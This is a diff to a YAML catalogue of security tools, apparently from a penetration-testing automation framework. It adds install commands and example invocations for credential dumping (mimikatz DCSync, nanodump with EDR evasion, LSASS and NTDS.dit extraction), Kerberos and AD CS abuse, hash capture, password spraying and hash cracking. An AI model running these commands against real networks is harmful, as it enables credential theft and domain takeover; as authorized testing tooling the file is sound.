@@ -1,5 +1,5 @@
 mimikatz:
-  description: "Windows credential extraction tool - dump LSASS, hashes, tickets, and more"
+  description: "Windows credential extraction — LSASS dump, hashes, tickets, DPAPI, vault"
   category: "windows"
   install_cmd: "apt-get install -y mimikatz"
   verify_cmd: "which mimikatz"
@@ -7,27 +7,154 @@ mimikatz:
     - "sekurlsa::logonpasswords"
     - "lsadump::lsa /inject"
     - "lsadump::sam"
+    - "lsadump::dcsync /domain:domain.local /user:krbtgt"
     - "kerberos::list /export"
+    - "dpapi::cred /in:<credential_file>"
+    - "vault::cred"
+
+nanodump:
+  description: "Stealthy LSASS dumper using direct syscalls to evade EDR"
+  category: "windows"
+  install_cmd: "git clone https://github.com/fortra/nanodump && cd nanodump && make"
+  verify_cmd: "ls nanodump.exe"
+  examples:
+    - "nanodump.exe --write C:\\Temp\\lsass.dmp"
+    - "nanodump.exe --write C:\\Temp\\lsass.dmp --valid"
+    - "nanodump.exe --fork --write C:\\Temp\\lsass.dmp"
+
+procdump:
+  description: "SysInternals tool for creating process memory dumps (LSASS)"
+  category: "windows"
+  install_cmd: "Download from https://learn.microsoft.com/en-us/sysinternals/downloads/procdump"
+  verify_cmd: "procdump.exe -accepteula"
+  examples:
+    - "procdump.exe -accepteula -ma lsass.exe lsass.dmp"
+
+secretsdump:
+  description: "Impacket — extract SAM, LSA, NTDS.dit, cached creds remotely or from files"
+  category: "windows"
+  install_cmd: "apt-get install -y python3-impacket"
+  verify_cmd: "which impacket-secretsdump"
+  examples:
+    - "impacket-secretsdump domain/user:pass@<DC_IP>"
+    - "impacket-secretsdump -hashes :NTHASH domain/user@<DC_IP>"
+    - "impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL"
+    - "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
+    - "impacket-secretsdump domain/user:pass@<DC_IP> -just-dc-ntlm"
+
+ntdsutil:
+  description: "Windows built-in for NTDS.dit extraction via IFM snapshot"
+  category: "windows"
+  install_cmd: "Built-in on Windows Server"
+  verify_cmd: "ntdsutil /?"
+  examples:
+    - 'ntdsutil "activate instance ntds" "ifm" "create full C:\\Temp\\ntds" quit quit'
+
+lazagne:
+  description: "Multi-platform password recovery — browsers, email, databases, sysadmin, wifi"
+  category: "multi"
+  install_cmd: "pip install lazagne"
+  verify_cmd: "lazagne.exe --help"
+  examples:
+    - "lazagne.exe all"
+    - "lazagne.exe browsers"
+    - "lazagne.exe windows"
+    - "lazagne.exe all -oJ"
+
+rubeus:
+  description: "C# Kerberos abuse — roasting, ticket requests, delegation, S4U"
+  category: "windows"
+  install_cmd: "Compile from https://github.com/GhostPack/Rubeus"
+  verify_cmd: "Rubeus.exe help"
+  examples:
+    - "Rubeus.exe kerberoast /outfile:kerberoast.txt"
+    - "Rubeus.exe asreproast /outfile:asrep.txt"
+    - "Rubeus.exe ptt /ticket:ticket.kirbi"
+    - "Rubeus.exe dump /nowrap"
+    - "Rubeus.exe s4u /user:svc /rc4:<hash> /impersonateuser:admin /msdsspn:cifs/target"
+
+certipy:
+  description: "AD Certificate Services (AD CS) abuse — ESC1-ESC8, certificate theft"
+  category: "windows"
+  install_cmd: "pip install certipy-ad"
+  verify_cmd: "certipy --version"
+  examples:
+    - "certipy find -u user@domain.local -p pass -dc-ip <DC_IP>"
+    - "certipy req -u user@domain.local -p pass -ca CA-NAME -template VulnTemplate -upn admin@domain.local"
+    - "certipy auth -pfx admin.pfx -dc-ip <DC_IP>"
+
+certify:
+  description: "C# tool for AD CS enumeration and certificate abuse"
+  category: "windows"
+  install_cmd: "Compile from https://github.com/GhostPack/Certify"
+  verify_cmd: "Certify.exe help"
+  examples:
+    - "Certify.exe find /vulnerable"
+    - "Certify.exe request /ca:CA-NAME /template:VulnTemplate /altname:admin"
+
+responder:
+  description: "LLMNR/NBT-NS/MDNS poisoner — capture NTLMv2 hashes on the wire"
+  category: "network"
+  install_cmd: "apt-get install -y responder"
+  verify_cmd: "responder --help | head -n 1"
+  examples:
+    - "responder -I eth0 -wrfv"
+    - "responder -I eth0 --lm"
+
+crackmapexec:
+  description: "Swiss army knife — password spray, hash spray, command exec, enum"
+  category: "network"
+  install_cmd: "apt-get install -y crackmapexec"
+  verify_cmd: "crackmapexec --version"
+  examples:
+    - "crackmapexec smb <target> -u user -p pass"
+    - "crackmapexec smb <target> -u users.txt -p 'Password1!' --continue-on-success"
+    - "crackmapexec smb <target> -u user -H <NTHASH> --lsa"
+
+netexec:
+  description: "CrackMapExec successor — same features, actively maintained"
+  category: "network"
+  install_cmd: "pip install netexec"
+  verify_cmd: "nxc --version"
+  examples:
+    - "nxc smb <target> -u user -p pass"
+    - "nxc smb <target> -u user -p pass --sam"
+    - "nxc ldap <DC_IP> -u user -p pass --kerberoast kerberoast.txt"
+
+kerbrute:
+  description: "Fast Kerberos brute-forcer — user enum, password spray, brute"
+  category: "network"
+  install_cmd: "go install github.com/ropnop/kerbrute@latest"
+  verify_cmd: "kerbrute --help"
+  examples:
+    - "kerbrute userenum --dc <DC_IP> -d domain.local users.txt"
+    - "kerbrute passwordspray --dc <DC_IP> -d domain.local users.txt 'Password1!'"
+    - "kerbrute bruteuser --dc <DC_IP> -d domain.local passwords.txt admin"
 
 hashcat:
-  description: "Advanced password recovery and hash cracking tool with GPU acceleration"
+  description: "GPU-accelerated password cracking — dictionary, rules, masks, combinator"
   category: "cracking"
   install_cmd: "apt-get install -y hashcat"
   verify_cmd: "hashcat --version"
   examples:
     - "hashcat -m 1000 hash.txt wordlist.txt"
-    - "hashcat -m 1000 hash.txt wordlist.txt --rules best64.rule"
+    - "hashcat -m 1000 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule"
+    - "hashcat -m 5600 hash.txt wordlist.txt"
+    - "hashcat -m 13100 kerberoast.txt wordlist.txt"
+    - "hashcat -m 18200 asrep.txt wordlist.txt"
+    - "hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?l?d?d?d"
     - "hashcat --identify hash.txt"
 
 john:
-  description: "Fast password cracker (John the Ripper) - supports many hash types"
+  description: "John the Ripper — versatile password cracker with format auto-detection"
   category: "cracking"
   install_cmd: "apt-get install -y john"
   verify_cmd: "john --version"
   examples:
     - "john --wordlist=wordlist.txt hash.txt"
-    - "john --show hash.txt"
     - "john --rules --wordlist=wordlist.txt hash.txt"
+    - "john --show hash.txt"
+    - "john --format=NT hash.txt --wordlist=wordlist.txt"
 
 hashid:
   description: "Identify hash types from hash strings"
@@ -36,6 +163,7 @@ hashid:
   verify_cmd: "hashid --version"
   examples:
     - "hashid hash.txt"
+    - "hashid -m 'aab3238922bcc25a6f606eb525ffdc56'"
 
 cewl:
   description: "Custom wordlist generator from target website content"
@@ -46,13 +174,12 @@ cewl:
     - "cewl -m 5 -w wordlist.txt http://target"
 
 crunch:
-  description: "Wordlist generator for brute-force password cracking"
+  description: "Pattern-based wordlist generator for brute-force"
   category: "cracking"
   install_cmd: "apt-get install -y crunch"
   verify_cmd: "crunch --help | head -n 1"
   examples:
     - "crunch 8 8 abcdefghijklmnopqrstuvwxyz -o wordlist.txt"
-    - "crunch 6 6 0123456789 -o numbers.txt"
 
 fcrackzip:
   description: "Zip file password cracker"
@@ -69,25 +196,6 @@ pdfcrack:
   verify_cmd: "pdfcrack --help | head -n 1"
   examples:
     - "pdfcrack -f document.pdf -w wordlist.txt"
-
-secretsdump:
-  description: "Extract secrets from Windows registry (sam, lsa, cached credentials)"
-  category: "windows"
-  install_cmd: "apt-get install -y impacket-secretsdump"
-  verify_cmd: "which impacket-secretsdump"
-  examples:
-    - "impacket-secretsdump -hashes :hash target/target"
-    - "impacket-secretsdump -just-dc-ntlm target/target"
-
-laZagne:
-  description: "Password recovery for many applications (browsers, email, databases, etc.)"
-  category: "windows"
-  install_cmd: "apt-get install -y laZagne"
-  verify_cmd: "which laZagne"
-  examples:
-    - "laZagne.exe all"
-    - "laZagne.exe browsers"
-    - "laZagne.exe windows"
 
 parse_hashcat_show:
   description: "Parse hashcat --show output into JSON evidence"
